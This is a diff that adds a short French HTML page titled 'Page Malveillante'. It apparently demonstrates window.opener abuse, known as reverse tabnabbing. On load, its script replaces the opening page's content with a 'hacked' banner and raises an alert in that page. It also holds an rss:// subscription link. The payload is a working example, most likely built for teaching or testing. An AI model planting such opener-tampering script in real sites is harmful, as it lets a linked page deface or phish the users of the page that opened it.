@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Page Malveillante</title>
+    <script>
+        window.onload = function () {
+            if (window.opener) {
+                window.opener.document.body.innerHTML = '<h1>Cette page a été piratée!</h1>';
+                window.opener.alert('Message depuis la page malveillante!');
+            }
+        }
+    </script>
+</head>
+
+<body>
+    <h1>Page Externe</h1>
+    <p>Regardez la page d'origine maintenant.</p>
+    <a href="rss://www.exemple.com/rssfeed">S'abonner au flux RSS</a>
+</body>
+</html>
